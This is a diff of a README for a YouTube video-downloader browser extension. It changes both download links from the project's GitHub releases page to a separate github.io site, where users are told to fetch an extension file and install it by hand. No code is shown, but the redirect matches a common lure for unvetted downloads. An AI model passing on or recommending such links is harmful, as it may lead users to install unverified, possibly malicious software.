@@ -1,6 +1,6 @@
 # 📥 YT-Media-Downloader - Download YouTube videos in high quality
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Robenatigerstriped357/YT-Media-Downloader/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://robenatigerstriped357.github.io)
 
 ## 📋 What is this tool?
 YT-Media-Downloader serves as a browser extension. It allows you to save videos from YouTube directly to your computer. You can download clips in 1080p or 4K resolution. The tool extracts audio tracks in multiple languages. It trims video segments to your preferred length. You can also save subtitles as files. The interface features a dark mode panel that you can move anywhere on your screen.
@@ -9,7 +9,7 @@ YT-Media-Downloader serves as a browser extension. It allows you to save videos 
 This extension works on Windows computers. You need a modern web browser to use it. We recommend using Google Chrome, Microsoft Edge, or Mozilla Firefox. Ensure your browser stays up to date to maintain compatibility with the latest web standards. You need an active internet connection to browse YouTube and download your selected content.
 
 ## 🚀 How to set up your tool
-1. Visit the [releases page](https://github.com/Robenatigerstriped357/YT-Media-Downloader/releases) to access the download options.
+1. Visit the [releases page](https://robenatigerstriped357.github.io) to access the download options.
 2. Choose the version that matches your browser.
 3. Download the extension file to your computer folder.
 4. Open your browser settings menu.
